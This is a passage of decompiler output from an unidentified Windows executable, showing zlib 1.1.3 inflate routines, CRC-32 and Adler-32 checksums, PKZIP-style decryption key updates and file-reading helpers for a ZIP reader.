                            ,local_8);
    if ((local_10 == 0) && (*param_4 != 0)) {
      local_10 = FUN_0040b290(param_3 + param_1,param_2,0,0x425ce8,0x425d60,param_7,param_5,param_8,
                              &local_c,local_8);
      if ((local_10 == 0) && ((*param_5 != 0 || (param_1 < 0x102)))) {
        (**(code **)(param_9 + 0x24))(*(undefined4 *)(param_9 + 0x28),local_8);
        local_10 = 0;
      }
      else {
        if (local_10 == -3) {
          *(char **)(param_9 + 0x18) = s_oversubscribed_distance_tree_00425e20;
        }
        else if (local_10 == -5) {
          *(char **)(param_9 + 0x18) = s_incomplete_distance_tree_00425e40;
          local_10 = -3;
        }
        else if (local_10 != -4) {
          *(char **)(param_9 + 0x18) = s_empty_distance_tree_with_lengths_00425e5c;
          local_10 = -3;
        }
        (**(code **)(param_9 + 0x24))(*(undefined4 *)(param_9 + 0x28),local_8);
      }
    }
    else {
      if (local_10 == -3) {
        *(char **)(param_9 + 0x18) = s_oversubscribed_literal_length_tr_00425cc4;
      }
      else if (local_10 != -4) {
        *(char **)(param_9 + 0x18) = s_incomplete_literal_length_tree_00425e00;
        local_10 = -3;
      }
      (**(code **)(param_9 + 0x24))(*(undefined4 *)(param_9 + 0x28),local_8);
    }
  }
  return local_10;
}



undefined4 __cdecl
FUN_0040bcf0(undefined4 *param_1,undefined4 *param_2,undefined4 *param_3,undefined4 *param_4)

{
  *param_1 = 9;
  *param_2 = 5;
  *param_3 = &DAT_004249b0;
  *param_4 = &DAT_004259b0;
  return 0;
}



undefined4 __cdecl
FUN_0040bd20(int param_1,int param_2,int param_3,int param_4,int param_5,byte **param_6)

{
  byte bVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint local_4c;
  uint local_48;
  uint local_44;
  uint local_40;
  uint local_3c;
  uint local_38;
  byte *local_34;
  uint local_30;
  int local_2c;
  byte *local_24;
  uint local_20;
  uint local_1c;
  byte *local_18;
  byte *local_10;
  byte *local_8;
  
  local_8 = *param_6;
  local_10 = param_6[1];
  local_1c = *(uint *)(param_5 + 0x20);
  local_20 = *(uint *)(param_5 + 0x1c);
  local_18 = *(byte **)(param_5 + 0x34);
  if (local_18 < *(byte **)(param_5 + 0x30)) {
    local_3c = (*(int *)(param_5 + 0x30) - (int)local_18) - 1;
  }
  else {
    local_3c = *(int *)(param_5 + 0x2c) - (int)local_18;
  }
  local_38 = local_3c;
  uVar2 = *(uint *)(&DAT_00424958 + param_1 * 4);
  uVar3 = *(uint *)(&DAT_00424958 + param_2 * 4);
LAB_0040bd9a:
  for (; local_20 < 0x14; local_20 = local_20 + 8) {
    local_10 = local_10 + -1;
    local_1c = (uint)*local_8 << ((byte)local_20 & 0x1f) | local_1c;
    local_8 = local_8 + 1;
  }
  local_34 = (byte *)(param_3 + (local_1c & uVar2) * 8);
  local_30 = (uint)*local_34;
  if (local_30 != 0) {
LAB_0040be2c:
    local_1c = local_1c >> (local_34[1] & 0x1f);
    local_20 = local_20 - local_34[1];
    if ((local_30 & 0x10) == 0) goto LAB_0040c1f1;
    local_30 = local_30 & 0xf;
    uVar5 = (local_1c & *(uint *)(&DAT_00424958 + local_30 * 4)) + *(int *)(local_34 + 4);
    local_1c = local_1c >> (sbyte)local_30;
    for (local_20 = local_20 - local_30; local_20 < 0xf; local_20 = local_20 + 8) {
      local_10 = local_10 + -1;
      local_1c = (uint)*local_8 << ((byte)local_20 & 0x1f) | local_1c;
      local_8 = local_8 + 1;
    }
    local_34 = (byte *)(param_4 + (local_1c & uVar3) * 8);
    bVar1 = *local_34;
    while( true ) {
      local_30 = (uint)bVar1;
      local_1c = local_1c >> (local_34[1] & 0x1f);
      local_20 = local_20 - local_34[1];
      if ((bVar1 & 0x10) != 0) break;
      if ((bVar1 & 0x40) != 0) {
        param_6[6] = (byte *)s_invalid_distance_code_00425e80;
        local_40 = (int)param_6[1] - (int)local_10;
        if (local_20 >> 3 < local_40) {
          local_40 = local_20 >> 3;
        }
        *(uint *)(param_5 + 0x20) = local_1c;
        *(uint *)(param_5 + 0x1c) = local_20 + local_40 * -8;
        param_6[1] = local_10 + local_40;
        param_6[2] = param_6[2] + ((int)(local_8 + -local_40) - (int)*param_6);
        *param_6 = local_8 + -local_40;
        *(byte **)(param_5 + 0x34) = local_18;
        return 0xfffffffd;
      }
      local_34 = local_34 +
                 (local_1c & *(uint *)(&DAT_00424958 + local_30 * 4)) * 8 +
                 *(int *)(local_34 + 4) * 8;
      bVar1 = *local_34;
    }
    local_30 = local_30 & 0xf;
    for (; local_20 < local_30; local_20 = local_20 + 8) {
      local_10 = local_10 + -1;
      local_1c = (uint)*local_8 << ((byte)local_20 & 0x1f) | local_1c;
      local_8 = local_8 + 1;
    }
    uVar4 = local_1c & *(uint *)(&DAT_00424958 + local_30 * 4);
    local_1c = local_1c >> (sbyte)local_30;
    local_20 = local_20 - local_30;
    local_38 = local_38 - uVar5;
    local_24 = local_18 + -(uVar4 + *(int *)(local_34 + 4));
    if (local_24 < *(byte **)(param_5 + 0x28)) {
      do {
        local_24 = local_24 + (*(int *)(param_5 + 0x2c) - *(int *)(param_5 + 0x28));
      } while (local_24 < *(byte **)(param_5 + 0x28));
      local_30 = *(int *)(param_5 + 0x2c) - (int)local_24;
      if (local_30 < uVar5) {
        local_2c = uVar5 - local_30;
        do {
          *local_18 = *local_24;
          local_18 = local_18 + 1;
          local_24 = local_24 + 1;
          local_30 = local_30 - 1;
        } while (local_30 != 0);
        local_24 = *(byte **)(param_5 + 0x28);
        do {
          *local_18 = *local_24;
          local_18 = local_18 + 1;
          local_24 = local_24 + 1;
          local_2c = local_2c + -1;
        } while (local_2c != 0);
      }
      else {
        *local_18 = *local_24;
        local_18[1] = local_24[1];
        local_18 = local_18 + 2;
        local_24 = local_24 + 2;
        local_2c = uVar5 - 2;
        do {
          *local_18 = *local_24;
          local_18 = local_18 + 1;
          local_24 = local_24 + 1;
          local_2c = local_2c + -1;
        } while (local_2c != 0);
      }
    }
    else {
      *local_18 = *local_24;
      local_18[1] = local_24[1];
      local_18 = local_18 + 2;
      local_24 = local_24 + 2;
      local_2c = uVar5 - 2;
      do {
        *local_18 = *local_24;
        local_18 = local_18 + 1;
        local_24 = local_24 + 1;
        local_2c = local_2c + -1;
      } while (local_2c != 0);
    }
    goto LAB_0040c3c2;
  }
  local_1c = local_1c >> (local_34[1] & 0x1f);
  local_20 = local_20 - local_34[1];
  *local_18 = local_34[4];
  local_18 = local_18 + 1;
  local_38 = local_38 - 1;
  goto LAB_0040c3c2;
LAB_0040c1f1:
  if ((local_30 & 0x40) != 0) {
    if ((local_30 & 0x20) != 0) {
      local_44 = (int)param_6[1] - (int)local_10;
      if (local_20 >> 3 < local_44) {
        local_44 = local_20 >> 3;
      }
      *(uint *)(param_5 + 0x20) = local_1c;
      *(uint *)(param_5 + 0x1c) = local_20 + local_44 * -8;
      param_6[1] = local_10 + local_44;
      param_6[2] = param_6[2] + ((int)(local_8 + -local_44) - (int)*param_6);
      *param_6 = local_8 + -local_44;
      *(byte **)(param_5 + 0x34) = local_18;
      return 1;
    }
    param_6[6] = (byte *)s_invalid_literal_length_code_00425e98;
    local_48 = (int)param_6[1] - (int)local_10;
    if (local_20 >> 3 < local_48) {
      local_48 = local_20 >> 3;
    }
    *(uint *)(param_5 + 0x20) = local_1c;
    *(uint *)(param_5 + 0x1c) = local_20 + local_48 * -8;
    param_6[1] = local_10 + local_48;
    param_6[2] = param_6[2] + ((int)(local_8 + -local_48) - (int)*param_6);
    *param_6 = local_8 + -local_48;
    *(byte **)(param_5 + 0x34) = local_18;
    return 0xfffffffd;
  }
  local_34 = local_34 +
             (local_1c & *(uint *)(&DAT_00424958 + local_30 * 4)) * 8 + *(int *)(local_34 + 4) * 8;
  local_30 = (uint)*local_34;
  if (local_30 == 0) goto code_r0x0040c22d;
  goto LAB_0040be2c;
code_r0x0040c22d:
  local_1c = local_1c >> (local_34[1] & 0x1f);
  local_20 = local_20 - local_34[1];
  *local_18 = local_34[4];
  local_18 = local_18 + 1;
  local_38 = local_38 - 1;
LAB_0040c3c2:
  if ((local_38 < 0x102) || (local_10 < (byte *)0xa)) {
    local_4c = (int)param_6[1] - (int)local_10;
    if (local_20 >> 3 < local_4c) {
      local_4c = local_20 >> 3;
    }
    *(uint *)(param_5 + 0x20) = local_1c;
    *(uint *)(param_5 + 0x1c) = local_20 + local_4c * -8;
    param_6[1] = local_10 + local_4c;
    param_6[2] = param_6[2] + ((int)(local_8 + -local_4c) - (int)*param_6);
    *param_6 = local_8 + -local_4c;
    *(byte **)(param_5 + 0x34) = local_18;
    return 0;
  }
  goto LAB_0040bd9a;
}



uint __cdecl FUN_0040c470(uint param_1,byte *param_2,uint param_3)

{
  uint uVar1;
  
  if (param_2 == (byte *)0x0) {
    uVar1 = 0;
  }
  else {
    param_1 = param_1 ^ 0xffffffff;
    for (; 7 < param_3; param_3 = param_3 - 8) {
      uVar1 = param_1 >> 8 ^ *(uint *)(&DAT_00425ed0 + ((*param_2 ^ param_1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_00425ed0 + ((param_2[1] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_00425ed0 + ((param_2[2] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_00425ed0 + ((param_2[3] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_00425ed0 + ((param_2[4] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_00425ed0 + ((param_2[5] ^ uVar1) & 0xff) * 4);
      uVar1 = uVar1 >> 8 ^ *(uint *)(&DAT_00425ed0 + ((param_2[6] ^ uVar1) & 0xff) * 4);
      param_1 = uVar1 >> 8 ^ *(uint *)(&DAT_00425ed0 + ((param_2[7] ^ uVar1) & 0xff) * 4);
      param_2 = param_2 + 8;
    }
    for (; param_3 != 0; param_3 = param_3 - 1) {
      param_1 = param_1 >> 8 ^ *(uint *)(&DAT_00425ed0 + ((*param_2 ^ param_1) & 0xff) * 4);
      param_2 = param_2 + 1;
    }
    uVar1 = param_1 ^ 0xffffffff;
  }
  return uVar1;
}



void __cdecl FUN_0040c620(uint *param_1,char param_2)

{
  *param_1 = *param_1 >> 8 ^ *(uint *)(&DAT_00425ed0 + (((int)param_2 ^ *param_1) & 0xff) * 4);
  param_1[1] = (*param_1 & 0xff) + param_1[1];
  param_1[1] = param_1[1] * 0x8088405 + 1;
  param_1[2] = param_1[2] >> 8 ^
               *(uint *)(&DAT_00425ed0 + ((param_1[1] >> 0x18 ^ param_1[2]) & 0xff) * 4);
  return;
}



uint __cdecl FUN_0040c6a0(int param_1)

{
  uint uVar1;
  
  uVar1 = *(uint *)(param_1 + 8) & 0xffff | 2;
  return (uVar1 ^ 1) * uVar1 >> 8 & 0xff;
}



byte __cdecl FUN_0040c6d0(uint *param_1,byte param_2)

{
  uint uVar1;
  byte bVar2;
  
  uVar1 = FUN_0040c6a0((int)param_1);
  bVar2 = param_2 ^ (byte)uVar1;
  FUN_0040c620(param_1,bVar2);
  return bVar2;
}



uint __cdecl FUN_0040c710(uint param_1,byte *param_2,uint param_3)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  int iVar14;
  int iVar15;
  uint local_14;
  uint local_10;
  uint local_c;
  uint local_8;
  
  local_10 = param_1 & 0xffff;
  local_c = param_1 >> 0x10;
  if (param_2 == (byte *)0x0) {
    local_10 = 1;
  }
  else {
    while (param_3 != 0) {
      if (param_3 < 0x15b0) {
        local_14 = param_3;
      }
      else {
        local_14 = 0x15b0;
      }
      param_3 = param_3 - local_14;
      for (local_8 = local_14; 0xf < (int)local_8; local_8 = local_8 - 0x10) {
        iVar1 = *param_2 + local_10;
        iVar2 = (uint)param_2[1] + iVar1;
        iVar3 = (uint)param_2[2] + iVar2;
        iVar4 = (uint)param_2[3] + iVar3;
        iVar5 = (uint)param_2[4] + iVar4;
        iVar6 = (uint)param_2[5] + iVar5;
        iVar7 = (uint)param_2[6] + iVar6;
        iVar8 = (uint)param_2[7] + iVar7;
        iVar9 = (uint)param_2[8] + iVar8;
        iVar10 = (uint)param_2[9] + iVar9;
        iVar11 = (uint)param_2[10] + iVar10;
        iVar12 = (uint)param_2[0xb] + iVar11;
        iVar13 = (uint)param_2[0xc] + iVar12;
        iVar14 = (uint)param_2[0xd] + iVar13;
        iVar15 = (uint)param_2[0xe] + iVar14;
        local_10 = (uint)param_2[0xf] + iVar15;
        local_c = local_c + iVar1 + iVar2 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 +
                  iVar10 + iVar11 + iVar12 + iVar13 + iVar14 + iVar15 + local_10;
        param_2 = param_2 + 0x10;
      }
      for (; local_8 != 0; local_8 = local_8 - 1) {
        local_10 = *param_2 + local_10;
        param_2 = param_2 + 1;
        local_c = local_c + local_10;
      }
      local_10 = local_10 % 0xfff1;
      local_c = local_c % 0xfff1;
    }
    local_10 = local_c << 0x10 | local_10;
  }
  return local_10;
}



void __cdecl FUN_0040c950(int param_1,size_t param_2,size_t param_3)

{
  _calloc(param_2,param_3);
  return;
}



void __cdecl FUN_0040c980(undefined4 param_1,void *param_2)

{
  _free(param_2);
  return;
}



undefined4 __cdecl FUN_0040c9a0(int param_1)

{
  undefined4 uVar1;
  
  if ((param_1 == 0) || (*(int *)(param_1 + 0x1c) == 0)) {
    uVar1 = 0xfffffffe;
  }
  else {
    *(undefined4 *)(param_1 + 0x14) = 0;
    *(undefined4 *)(param_1 + 8) = 0;
    *(undefined4 *)(param_1 + 0x18) = 0;
    **(uint **)(param_1 + 0x1c) = -(uint)(*(int *)(*(int *)(param_1 + 0x1c) + 0xc) != 0) & 7;
    FUN_00409d00(*(int **)(*(int *)(param_1 + 0x1c) + 0x14),param_1,(int *)0x0);
    uVar1 = 0;
  }
  return uVar1;
}



undefined4 __cdecl FUN_0040ca10(int param_1)

{
  undefined4 uVar1;
  
  if (((param_1 == 0) || (*(int *)(param_1 + 0x1c) == 0)) || (*(int *)(param_1 + 0x24) == 0)) {
    uVar1 = 0xfffffffe;
  }
  else {
    if (*(int *)(*(int *)(param_1 + 0x1c) + 0x14) != 0) {
      FUN_0040b220(*(int **)(*(int *)(param_1 + 0x1c) + 0x14),param_1);
    }
    (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),*(undefined4 *)(param_1 + 0x1c));
    *(undefined4 *)(param_1 + 0x1c) = 0;
    uVar1 = 0;
  }
  return uVar1;
}



// WARNING: Removing unreachable block (ram,0x0040cb7c)

undefined4 __cdecl FUN_0040ca80(int param_1)

{
  undefined4 uVar1;
  int *piVar2;
  
  if (s_1_1_3_004262d8[0] == s_1_1_3_004262e0[0]) {
    if (param_1 == 0) {
      uVar1 = 0xfffffffe;
    }
    else {
      *(undefined4 *)(param_1 + 0x18) = 0;
      if (*(int *)(param_1 + 0x20) == 0) {
        *(code **)(param_1 + 0x20) = FUN_0040c950;
        *(undefined4 *)(param_1 + 0x28) = 0;
      }
      if (*(int *)(param_1 + 0x24) == 0) {
        *(code **)(param_1 + 0x24) = FUN_0040c980;
      }
      uVar1 = (**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),1,0x18);
      *(undefined4 *)(param_1 + 0x1c) = uVar1;
      if (*(int *)(param_1 + 0x1c) == 0) {
        uVar1 = 0xfffffffc;
      }
      else {
        *(undefined4 *)(*(int *)(param_1 + 0x1c) + 0x14) = 0;
        *(undefined4 *)(*(int *)(param_1 + 0x1c) + 0xc) = 0;
        *(undefined4 *)(*(int *)(param_1 + 0x1c) + 0xc) = 1;
        *(undefined4 *)(*(int *)(param_1 + 0x1c) + 0x10) = 0xf;
        piVar2 = FUN_00409dc0(*(void **)(param_1 + 0x1c),param_1,
                              ~-(uint)(*(int *)((int)*(void **)(param_1 + 0x1c) + 0xc) != 0) &
                              0x40c710,0x8000);
        *(int **)(*(int *)(param_1 + 0x1c) + 0x14) = piVar2;
        if (*(int *)(*(int *)(param_1 + 0x1c) + 0x14) == 0) {
          FUN_0040ca10(param_1);
          uVar1 = 0xfffffffc;
        }
        else {
          FUN_0040c9a0(param_1);
          uVar1 = 0;
        }
      }
    }
  }
  else {
    uVar1 = 0xfffffffa;
  }
  return uVar1;
}



uint __cdecl FUN_0040cc10(byte **param_1,int param_2)

{
  byte bVar1;
  uint uVar2;
  uint uVar3;
  uint local_c;
  
  if (((param_1 == (byte **)0x0) || (param_1[7] == (byte *)0x0)) || (*param_1 == (byte *)0x0)) {
    return 0xfffffffe;
  }
  uVar3 = (param_2 != 4) - 1 & 0xfffffffb;
  local_c = 0xfffffffb;
  do {
    switch(*(undefined4 *)param_1[7]) {
    case 0:
      if (param_1[1] == (byte *)0x0) {
        return local_c;
      }
      param_1[1] = param_1[1] + -1;
      param_1[2] = param_1[2] + 1;
      *(uint *)(param_1[7] + 4) = (uint)**param_1;
      uVar2 = *(uint *)(param_1[7] + 4);
      *param_1 = *param_1 + 1;
      if ((uVar2 & 0xf) != 8) {
        *(undefined4 *)param_1[7] = 0xd;
        param_1[6] = (byte *)s_unknown_compression_method_00425eb4;
        *(undefined4 *)(param_1[7] + 4) = 5;
        local_c = uVar3;
        break;
      }
      if (*(uint *)(param_1[7] + 0x10) < (*(uint *)(param_1[7] + 4) >> 4) + 8) {
        *(undefined4 *)param_1[7] = 0xd;
        param_1[6] = (byte *)s_invalid_window_size_004262e8;
        *(undefined4 *)(param_1[7] + 4) = 5;
        local_c = uVar3;
        break;
      }
      *(undefined4 *)param_1[7] = 1;
      local_c = uVar3;
    case 1:
      if (param_1[1] == (byte *)0x0) {
        return local_c;
      }
      param_1[1] = param_1[1] + -1;
      param_1[2] = param_1[2] + 1;
      bVar1 = **param_1;
      *param_1 = *param_1 + 1;
      if ((*(int *)(param_1[7] + 4) * 0x100 + (uint)bVar1) % 0x1f == 0) {
        if ((bVar1 & 0x20) != 0) {
          *(undefined4 *)param_1[7] = 2;
          local_c = uVar3;
          goto switchD_0040cc68_caseD_2;
        }
        *(undefined4 *)param_1[7] = 7;
        local_c = uVar3;
      }
      else {
        *(undefined4 *)param_1[7] = 0xd;
        param_1[6] = (byte *)s_incorrect_header_check_004262fc;
        *(undefined4 *)(param_1[7] + 4) = 5;
        local_c = uVar3;
      }
      break;
    case 2:
switchD_0040cc68_caseD_2:
      if (param_1[1] == (byte *)0x0) {
        return local_c;
      }
      param_1[1] = param_1[1] + -1;
      param_1[2] = param_1[2] + 1;
      *(uint *)(param_1[7] + 8) = (uint)**param_1 << 0x18;
      *param_1 = *param_1 + 1;
      *(undefined4 *)param_1[7] = 3;
      local_c = uVar3;
switchD_0040cc68_caseD_3:
      if (param_1[1] == (byte *)0x0) {
        return local_c;
      }
      param_1[1] = param_1[1] + -1;
      param_1[2] = param_1[2] + 1;
      *(uint *)(param_1[7] + 8) = (uint)**param_1 * 0x10000 + *(int *)(param_1[7] + 8);
      *param_1 = *param_1 + 1;
      *(undefined4 *)param_1[7] = 4;
      local_c = uVar3;
switchD_0040cc68_caseD_4:
      if (param_1[1] == (byte *)0x0) {
        return local_c;
      }
      param_1[1] = param_1[1] + -1;
      param_1[2] = param_1[2] + 1;
      *(uint *)(param_1[7] + 8) = (uint)**param_1 * 0x100 + *(int *)(param_1[7] + 8);
      *param_1 = *param_1 + 1;
      *(undefined4 *)param_1[7] = 5;
      local_c = uVar3;
switchD_0040cc68_caseD_5:
      if (param_1[1] == (byte *)0x0) {
        return local_c;
      }
      param_1[1] = param_1[1] + -1;
      param_1[2] = param_1[2] + 1;
      *(uint *)(param_1[7] + 8) = (uint)**param_1 + *(int *)(param_1[7] + 8);
      *param_1 = *param_1 + 1;
      param_1[0xc] = *(byte **)(param_1[7] + 8);
      *(undefined4 *)param_1[7] = 6;
      return 2;
    case 3:
      goto switchD_0040cc68_caseD_3;
    case 4:
      goto switchD_0040cc68_caseD_4;
    case 5:
      goto switchD_0040cc68_caseD_5;
    case 6:
      *(undefined4 *)param_1[7] = 0xd;
      param_1[6] = (byte *)s_need_dictionary_00426314;
      *(undefined4 *)(param_1[7] + 4) = 0;
      return 0xfffffffe;
    case 7:
      local_c = FUN_00409ed0(*(uint **)(param_1[7] + 0x14),param_1,local_c);
      if (local_c == 0xfffffffd) {
        *(undefined4 *)param_1[7] = 0xd;
        *(undefined4 *)(param_1[7] + 4) = 0;
        local_c = 0xfffffffd;
      }
      else {
        if (local_c == 0) {
          local_c = uVar3;
        }
        if (local_c != 1) {
          return local_c;
        }
        FUN_00409d00(*(int **)(param_1[7] + 0x14),(int)param_1,(int *)(param_1[7] + 4));
        if (*(int *)(param_1[7] + 0xc) == 0) {
          *(undefined4 *)param_1[7] = 8;
          local_c = uVar3;
          goto switchD_0040cc68_caseD_8;
        }
        *(undefined4 *)param_1[7] = 0xc;
        local_c = uVar3;
      }
      break;
    case 8:
switchD_0040cc68_caseD_8:
      if (param_1[1] == (byte *)0x0) {
        return local_c;
      }
      param_1[1] = param_1[1] + -1;
      param_1[2] = param_1[2] + 1;
      *(uint *)(param_1[7] + 8) = (uint)**param_1 << 0x18;
      *param_1 = *param_1 + 1;
      *(undefined4 *)param_1[7] = 9;
      local_c = uVar3;
switchD_0040cc68_caseD_9:
      if (param_1[1] == (byte *)0x0) {
        return local_c;
      }
      param_1[1] = param_1[1] + -1;
      param_1[2] = param_1[2] + 1;
      *(uint *)(param_1[7] + 8) = (uint)**param_1 * 0x10000 + *(int *)(param_1[7] + 8);
      *param_1 = *param_1 + 1;
      *(undefined4 *)param_1[7] = 10;
      local_c = uVar3;
switchD_0040cc68_caseD_a:
      if (param_1[1] == (byte *)0x0) {
        return local_c;
      }
      param_1[1] = param_1[1] + -1;
      param_1[2] = param_1[2] + 1;
      *(uint *)(param_1[7] + 8) = (uint)**param_1 * 0x100 + *(int *)(param_1[7] + 8);
      *param_1 = *param_1 + 1;
      *(undefined4 *)param_1[7] = 0xb;
      local_c = uVar3;
switchD_0040cc68_caseD_b:
      if (param_1[1] == (byte *)0x0) {
        return local_c;
      }
      param_1[1] = param_1[1] + -1;
      param_1[2] = param_1[2] + 1;
      *(uint *)(param_1[7] + 8) = (uint)**param_1 + *(int *)(param_1[7] + 8);
      *param_1 = *param_1 + 1;
      if (*(int *)(param_1[7] + 4) == *(int *)(param_1[7] + 8)) {
        *(undefined4 *)param_1[7] = 0xc;
LAB_0040d282:
        return 1;
      }
      *(undefined4 *)param_1[7] = 0xd;
      param_1[6] = (byte *)s_incorrect_data_check_00426324;
      *(undefined4 *)(param_1[7] + 4) = 5;
      local_c = uVar3;
      break;
    case 9:
      goto switchD_0040cc68_caseD_9;
    case 10:
      goto switchD_0040cc68_caseD_a;
    case 0xb:
      goto switchD_0040cc68_caseD_b;
    case 0xc:
      goto LAB_0040d282;
    case 0xd:
      return 0xfffffffd;
    default:
      return 0xfffffffe;
    }
  } while( true );
}



undefined * __cdecl FUN_0040d2c0(LPCWSTR param_1,undefined4 param_2,int param_3,undefined4 *param_4)

{
  undefined *puVar1;
  DWORD DVar2;
  undefined local_a;
  bool local_9;
  LPCWSTR local_8;
  
  if (((param_3 == 1) || (param_3 == 2)) || (param_3 == 3)) {
    local_8 = (LPCWSTR)0x0;
    local_9 = false;
    *param_4 = 0;
    local_a = 0;
    if ((param_3 == 1) || (param_3 == 2)) {
      if (param_3 == 1) {
        local_8 = param_1;
        local_a = 0;
      }
      else {
        local_8 = (LPCWSTR)CreateFileW(param_1,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,
                                       (HANDLE)0x0);
        if (local_8 == (LPCWSTR)0xffffffff) {
          *param_4 = 0x200;
          return (undefined *)0x0;
        }
        local_a = 1;
      }
      DVar2 = SetFilePointer(local_8,0,(PLONG)0x0,1);
      local_9 = DVar2 != 0xffffffff;
    }
    puVar1 = (undefined *)operator_new(0x18);
    if ((param_3 == 1) || (param_3 == 2)) {
      *puVar1 = 1;
      puVar1[0xb] = local_a;
      puVar1[1] = local_9;
      *(LPCWSTR *)(puVar1 + 2) = local_8;
      puVar1[6] = 0;
      *(undefined4 *)(puVar1 + 7) = 0;
      if (local_9 != false) {
        DVar2 = SetFilePointer(local_8,0,(PLONG)0x0,1);
        *(DWORD *)(puVar1 + 7) = DVar2;
      }
    }
    else {
      *puVar1 = 0;
      puVar1[1] = 1;
      puVar1[0xb] = 0;
      *(LPCWSTR *)(puVar1 + 0xc) = param_1;
      *(undefined4 *)(puVar1 + 0x10) = param_2;
      *(undefined4 *)(puVar1 + 0x14) = 0;
      *(undefined4 *)(puVar1 + 7) = 0;
    }
    *param_4 = 0;
  }
  else {
    *param_4 = 0x10000;
    puVar1 = (undefined *)0x0;
  }
  return puVar1;
}



undefined4 __cdecl FUN_0040d440(void *param_1)

{
  undefined4 uVar1;
  
  if (param_1 == (void *)0x0) {
    uVar1 = 0xffffffff;
  }
  else {
    if (*(char *)((int)param_1 + 0xb) != '\0') {
      CloseHandle(*(HANDLE *)((int)param_1 + 2));
    }
    FUN_00410837(param_1);
    uVar1 = 0;
  }
  return uVar1;
}



undefined4 __cdecl FUN_0040d480(char *param_1)

{
  undefined4 uVar1;
  
  if ((*param_1 == '\0') || (param_1[6] == '\0')) {
    uVar1 = 0;
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}



int __cdecl FUN_0040d4b0(char *param_1)

{
  DWORD DVar1;
  int iVar2;
  
  if ((*param_1 == '\0') || (param_1[1] == '\0')) {
    if (*param_1 == '\0') {
      iVar2 = *(int *)(param_1 + 0x14);
    }
    else {
      iVar2 = 0;
    }
  }
  else {
    DVar1 = SetFilePointer(*(HANDLE *)(param_1 + 2),0,(PLONG)0x0,1);
    iVar2 = DVar1 - *(int *)(param_1 + 7);
  }
  return iVar2;
}



undefined4 __cdecl FUN_0040d500(char *param_1,int param_2,int param_3)

{
  undefined4 uVar1;
  
  if ((*param_1 == '\0') || (param_1[1] == '\0')) {
    if (*param_1 == '\0') {
      if (param_3 == 0) {
        *(int *)(param_1 + 0x14) = param_2;
      }
      else if (param_3 == 1) {
        *(int *)(param_1 + 0x14) = *(int *)(param_1 + 0x14) + param_2;
      }
      else if (param_3 == 2) {
        *(int *)(param_1 + 0x14) = *(int *)(param_1 + 0x10) + param_2;
      }
      uVar1 = 0;
    }
    else {
      uVar1 = 0x1d;
    }
  }
  else {
    if (param_3 == 0) {
      SetFilePointer(*(HANDLE *)(param_1 + 2),*(int *)(param_1 + 7) + param_2,(PLONG)0x0,0);
    }
    else if (param_3 == 1) {
      SetFilePointer(*(HANDLE *)(param_1 + 2),param_2,(PLONG)0x0,1);
    }
    else {
      if (param_3 != 2) {
        return 0x13;
      }
      SetFilePointer(*(HANDLE *)(param_1 + 2),param_2,(PLONG)0x0,2);
    }
    uVar1 = 0;
  }
  return uVar1;
}



uint __cdecl FUN_0040d5e0(void *param_1,uint param_2,int param_3,char *param_4)

{
  BOOL BVar1;
  uint local_14 [2];
  uint local_c;
  
  local_c = param_2 * param_3;
  if (*param_4 == '\0') {
    if (*(uint *)(param_4 + 0x10) < *(int *)(param_4 + 0x14) + local_c) {
      local_c = *(int *)(param_4 + 0x10) - *(int *)(param_4 + 0x14);
    }
    _memcpy(param_1,(void *)(*(int *)(param_4 + 0xc) + *(int *)(param_4 + 0x14)),local_c);
    *(uint *)(param_4 + 0x14) = *(int *)(param_4 + 0x14) + local_c;
  }
  else {
    BVar1 = ReadFile(*(HANDLE *)(param_4 + 2),param_1,local_c,local_14,(LPOVERLAPPED)0x0);
    local_c = local_14[0];
    if (BVar1 == 0) {
      param_4[6] = '\x01';
    }
  }
  return local_c / param_2;
}



undefined4 __cdecl FUN_0040d690(char *param_1,uint *param_2)

{
  undefined4 uVar1;
  int iVar2;
  byte local_9;
  uint local_8;
  
  local_8 = FUN_0040d5e0(&local_9,1,1,param_1);
  if (local_8 == 1) {
    *param_2 = (uint)local_9;
    uVar1 = 0;
  }
  else {
    iVar2 = FUN_0040d480(param_1);
    if (iVar2 == 0) {
      uVar1 = 0;
    }
    else {
      uVar1 = 0xffffffff;
    }
  }
  return uVar1;
}



int __cdecl FUN_0040d6e0(char *param_1,int *param_2)

{
  int local_10;
  uint local_c;
  uint local_8;
  
  local_10 = FUN_0040d690(param_1,&local_c);
  local_8 = local_c;
  if (local_10 == 0) {
    local_10 = FUN_0040d690(param_1,&local_c);
  }
  if (local_10 == 0) {
    *param_2 = local_c * 0x100 + local_8;
  }
  else {
    *param_2 = 0;
  }
  return local_10;
}



int __cdecl FUN_0040d750(char *param_1,int *param_2)

{
  int local_10;
  uint local_c;
  uint local_8;
  
  local_10 = FUN_0040d690(param_1,&local_c);
  local_8 = local_c;
  if (local_10 == 0) {
    local_10 = FUN_0040d690(param_1,&local_c);
  }
  local_8 = local_c * 0x100 + local_8;
  if (local_10 == 0) {
    local_10 = FUN_0040d690(param_1,&local_c);
  }
  local_8 = local_c * 0x10000 + local_8;
  if (local_10 == 0) {
    local_10 = FUN_0040d690(param_1,&local_c);
  }
  if (local_10 == 0) {
    *param_2 = local_c * 0x1000000 + local_8;
  }
  else {
    *param_2 = 0;
  }
  return local_10;
}



int __cdecl FUN_0040d800(char *param_1)

{
  int iVar1;
  uint uVar2;
  void *_Memory;
  int iVar3;
  uint uVar4;
  uint local_28;
  int local_1c;
  uint local_18;
  uint local_10;
  int local_c;
  
  iVar1 = FUN_0040d500(param_1,0,2);
  if (iVar1 == 0) {
    uVar2 = FUN_0040d4b0(param_1);
